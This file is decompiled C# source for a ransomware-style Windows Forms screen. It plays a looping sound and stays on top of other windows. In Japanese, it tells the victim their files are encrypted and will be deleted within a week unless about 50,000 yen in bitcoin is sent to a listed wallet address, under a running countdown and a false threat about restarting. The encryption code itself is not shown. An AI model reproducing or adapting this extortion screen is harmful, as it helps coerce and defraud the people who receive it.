using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class Form1 : Form
{
	private GInterface5 ginterface5_0 = (GInterface5)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid("6BF52A52-394A-11D3-B153-00C04F79FAA6")));

	private static int int_0 = 604800;

	private IContainer icontainer_0;

	private Label label1;

	private TextBox textBox1;

	private Label label2;

	private Timer timer_0;

	private Label label3;

	public Form1()
	{
		InitializeComponent();
		ginterface5_0.GInterface4_0.imethod_0("loop", bool_0: true);
		ginterface5_0.String_0 = "jihou.mp3";
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		if (int_0 == 0)
		{
			Form1.smethod_0((Control)(object)label3, Color.Red);
			Form1.smethod_1((Control)(object)label3, "TIME OUT");
		}
		else
		{
			((Control)label3).set_Text("残り" + int_0 + "秒");
			int_0--;
		}
	}

	void Form.Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			Form1.smethod_2((IDisposable)icontainer_0);
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_00eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f5: Expected O, but got Unknown
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_017c: Expected O, but got Unknown
		//IL_022f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0239: Expected O, but got Unknown
		icontainer_0 = Form1.smethod_3();
		label1 = Form1.smethod_4();
		textBox1 = Form1.smethod_5();
		label2 = Form1.smethod_4();
		timer_0 = Form1.smethod_6(icontainer_0);
		label3 = Form1.smethod_4();
		Form1.smethod_7((Control)(object)this);
		Form1.smethod_8((Control)(object)label1, bool_0: true);
		Form1.smethod_10((Control)(object)label1, Form1.smethod_9("MS UI Gothic", 20f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((Control)label1).set_Location(new Point(8, 12));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(746, 162));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("こんにちは。\r\nあなたのコンピュータはウイルスに感染してしまいました。\r\nこのコンピュータに保存されているファイルはすべて暗号化され、開けなく\r\nなっています。\r\nそして今から1週間後にファイルは削除され永遠になくなります。\r\n制限時間内に5万円相当のビットコイン(送信時のレートで)を");
		((Control)textBox1).set_Font(new Font("MS UI Gothic", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((Control)textBox1).set_Location(new Point(18, 190));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(554, 27));
		((Control)textBox1).set_TabIndex(1);
		((Control)textBox1).set_Text("1ATzzF7XP3BKMZpuFRMKBuW6oU8ckwKXt2");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("MS UI Gothic", 20f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((Control)label2).set_Location(new Point(13, 220));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(614, 135));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("このアドレスに送ってください。\r\n送金が確認され次第ファイルを復号化します。\r\n\r\n1.再起動しないでください。タイマーの速度が速くなります。\r\n2.ビットコインの買い方はmoonpayが最善です。");
		timer_0.set_Enabled(true);
		timer_0.set_Interval(1000);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("MS UI Gothic", 15f, (FontStyle)0, (GraphicsUnit)3, (byte)128));
		((Control)label3).set_Location(new Point(509, 342));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(45, 20));
		((Control)label3).set_TabIndex(3);
		((Control)label3).set_Text("time");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.ActiveCaptionText);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).set_ForeColor(Color.Lime);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	static void smethod_0(Control control_0, Color color_0)
	{
		control_0.set_ForeColor(color_0);
	}

	static void smethod_1(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static void smethod_2(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_3()
	{
		return new Container();
	}

	static Label smethod_4()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static TextBox smethod_5()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new TextBox();
	}

	static Timer smethod_6(IContainer icontainer_1)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_1);
	}

	static void smethod_7(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_8(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static Font smethod_9(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_10(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}
}
